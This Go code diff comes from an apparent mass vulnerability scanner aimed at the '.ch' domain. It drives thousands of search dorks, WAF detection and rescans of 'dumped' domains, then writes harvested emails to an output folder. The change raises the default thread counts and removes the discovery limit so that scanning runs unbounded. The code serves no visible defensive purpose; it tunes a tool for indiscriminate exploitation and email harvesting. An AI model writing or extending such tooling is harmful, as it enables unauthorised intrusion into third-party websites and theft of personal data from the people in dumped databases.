@@ -41,7 +41,7 @@ func runBigTier(tier discover.BigTier, args []string) {
 	printer.Header(version)
 	printer.KV("mode", label+" — max vulns + emails (.ch)")
 	printer.KV("discover", "6525+ dorks vuln + DBMS/WAF")
-	printer.KV("limit", fmt.Sprintf("%d urls", cfg.discoverLimit))
+	printer.KV("limit", discoverLimitLabel(cfg.discoverLimit))
 	printer.KV("threads", fmt.Sprintf("scan %d · urls %d · extract %d", cfg.threads, cfg.urlConcurrency, cfg.extractThreads))
 	printer.KV("scan", "full + waf + rescan domaines dumpés")
 	printer.KV("output", cfg.outputDir+"/emails/")
@@ -124,16 +124,15 @@ func bigPhaseName(tier discover.BigTier) string {
 }
 
 func parseBigTierArgs(tier discover.BigTier, args []string) (config, error) {
-	limit := discover.DefaultDiscoverLimit(tier)
-	urlThreads := "96"
-	extractThreads := "4"
-	scanThreads := "12"
-	progressEvery := "200"
-	if tier == discover.BigTierMonthly {
-		urlThreads = "128"
-		extractThreads = "8"
-		scanThreads = "16"
-		progressEvery = "500"
+	urlThreads := "128"
+	extractThreads := "8"
+	scanThreads := "16"
+	progressEvery := "500"
+	if tier == discover.BigTierWeekly {
+		urlThreads = "96"
+		extractThreads = "6"
+		scanThreads = "12"
+		progressEvery = "200"
 	}
 	scanArgs := append([]string{
 		"-D", "ch", "--mass", "--full", "--waf", "--rescan",
@@ -142,7 +141,18 @@ func parseBigTierArgs(tier discover.BigTier, args []string) (config, error) {
 		"--threads", scanThreads,
 		"--extract-threads", extractThreads,
 		"--progress-every", progressEvery,
-		"--discover-limit", fmt.Sprintf("%d", limit),
 	}, args...)
-	return parseArgs(scanArgs)
+	cfg, err := parseArgs(scanArgs)
+	if err != nil {
+		return cfg, err
+	}
+	cfg.discoverLimit = 0
+	return cfg, nil
+}
+
+func discoverLimitLabel(n int) string {
+	if n <= 0 {
+		return "illimité"
+	}
+	return fmt.Sprintf("%d urls", n)
 }
